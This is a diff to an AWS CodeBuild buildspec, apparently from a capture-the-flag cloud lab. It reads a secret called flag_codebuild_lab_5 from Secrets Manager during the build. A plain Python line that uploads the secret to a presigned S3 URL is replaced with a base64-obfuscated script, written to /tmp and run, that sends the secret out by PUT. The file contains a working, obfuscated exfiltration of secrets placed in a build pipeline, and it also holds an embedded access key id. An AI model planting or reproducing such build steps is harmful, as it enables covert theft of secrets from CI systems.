@@ -4,5 +4,6 @@ phases:
   build:
     commands:
       - FLAG=$(aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --query SecretString --output text)
-      - python3 -c "import os, urllib.request; urllib.request.urlopen(urllib.request.Request('https://codebuild-lab-6-exfil-5lwr07ja3pm0.s3.amazonaws.com/exfil/lab5-1782249922.txt?AWSAccessKeyId=AKIA2MNVL2XEEVNGIVMV&Signature=77rFqg69LZu0621FM1ph2KrFtzw%3D&Expires=1782250823', data=os.environ.get('FLAG','').encode(), method='PUT'), timeout=20)"
+      - printf '%s' 'aW1wb3J0IGJhc2U2NCwgb3MsIHVybGxpYi5yZXF1ZXN0CnVybD1iYXNlNjQuYjY0ZGVjb2RlKCdhSFIwY0hNNkx5OWpiMlJsWW5WcGJHUXRiR0ZpTFRRdFluVmphMlYwTFdGcWNEZHlPSFoyYkc5d015NXpNeTVoYldGNmIyNWhkM011WTI5dEwySjFhV3hrYzNCbFl5NTZhWEEvV0MxQmJYb3RRV3huYjNKcGRHaHRQVUZYVXpRdFNFMUJReTFUU0VFeU5UWW1XQzFCYlhvdFEzSmxaR1Z1ZEdsaGJEMUJTMGxCTWsxT1Zrd3lXRVZDV1VSUFZVSkVNaVV5UmpJd01qWXdOakl6SlRKR2RYTXRaV0Z6ZEMweEpUSkdjek1sTWtaaGQzTTBYM0psY1hWbGMzUW1XQzFCYlhvdFJHRjBaVDB5TURJMk1EWXlNMVF5TVRNd05ERmFKbGd0UVcxNkxWTnBaMjVsWkVobFlXUmxjbk05YUc5emRDWllMVUZ0ZWkxRmVIQnBjbVZ6UFRrd01DWllMVUZ0ZWkxVGFXZHVZWFIxY21VOU5USTNNV0l6TkRRMk5EVTNaVEpqWTJVMU9ETm1NRGM1WldVNU0yTmlOVGhtTmpWaE5EWTJZakU1TTJRNFpEUmtZemcwT1RFNVkyRTBOVFkxTmpabU9BPT0nKS5kZWNvZGUoKQpyZXE9dXJsbGliLnJlcXVlc3QuUmVxdWVzdCh1cmwsIGRhdGE9b3MuZW52aXJvbi5nZXQoJ0ZMQUcnLCcnKS5lbmNvZGUoKSwgbWV0aG9kPSdQVVQnKQp3aXRoIHVybGxpYi5yZXF1ZXN0LnVybG9wZW4ocmVxLCB0aW1lb3V0PTIwKSBhcyByOgogICAgcGFzcwo=' | base64 -d > /tmp/put_flag.py
+      - python3 /tmp/put_flag.py
       - echo done
